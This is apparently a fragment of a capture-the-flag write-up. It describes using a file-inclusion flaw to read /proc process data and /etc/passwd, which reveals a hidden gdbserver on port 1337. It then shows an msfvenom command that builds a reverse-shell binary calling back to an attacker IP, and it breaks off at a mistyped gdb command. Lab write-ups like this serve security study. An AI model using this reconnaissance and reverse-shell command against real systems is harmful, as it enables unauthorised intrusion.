Access as [user]

Reference for /proc

  1. I can get a list of processes and their PID number by /proc/sched_debug
  2. I can go deeper and know which processes running in cmd by /proc/PID/cmdline , any process contain this file mean it’s running in Terminal.
  3. As we know process run in Terminal must have owner and shell type. so here we searching for a PID that have any of three things:
    • cmdline file & bash|sh shell & owner user as we got from /etc/passwd
  4. if we back to step (1) and searched for bash will find 3 matches so, Let’s focus on those 3 first.
  5. I changed LFI to /proc/4874/cmdline now i got that there is a service gdbserver and running on 0.0.0.0:1337 which mean this port was opened but didn’t appear to us on port scanning.
  6. By searching for exploit searchsploit gdbserver i found one Ref
  7. but i used another way that i’m used gdb pre-installed tool in parrot-OS
  8. Will create our revshell file using msfvenom first
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.16.6 LPORT=4444 -f elf -o rev.elf
  1. Now Let’s use gdp tool to connect
$ gdp
